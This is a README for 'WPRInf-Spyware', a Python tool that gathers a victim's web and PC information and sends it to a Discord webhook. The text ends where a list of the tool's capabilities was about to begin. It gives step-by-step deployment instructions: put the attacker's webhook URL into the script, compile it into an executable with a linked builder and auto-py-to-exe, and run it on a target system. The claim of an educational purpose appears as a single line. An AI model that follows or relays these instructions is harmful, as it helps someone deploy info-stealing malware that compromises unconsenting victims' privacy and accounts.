WPRInf-Spyware is a Python script that gathers information about a victim's web and PC and sends it to a Discord webhook. This tool is intended for educational purposes and is released under the MIT license.

This is an improved version of [Roblox-Webhook](https://github.com/independent-coder/Roblox-Webhooks) â€“ smaller, lighter, and more portable.

# Editing the File

Now, you'll need a text editor to enter the webhook URL you just copied. Here are a few options:

- [Notepad++](https://notepad-plus-plus.org/downloads/)
- [Sublime Text](https://www.sublimetext.com)
- [Visual Studio Code](https://code.visualstudio.com)
- Or you can use the default Notepad.

Open the [WPRInf-Spy.py](https://github.com/independent-coder/WPRInf-Spyware/blob/main/WPRInf-Spy.py) then go the 97 line and the copied URl then now you can continue.




## Usage
Compile the script using [WPRInf-EXE-Builder](https://github.com/independent-coder/WPRInf-Spyware/blob/main/WPRBuilder.exe) made by me. This will create an executable that you can run on the target system.

But before download it you need to install [AUTO-PY-TO-EXE](https://pypi.org/project/auto-py-to-exe/).

To do this simply execute this command.

```bash
pip install auto-py-to-exe
```
If you don't trust me you can use the manual way to compile using only auto-py-to-exe.

Now let's talk about the thing you can do :
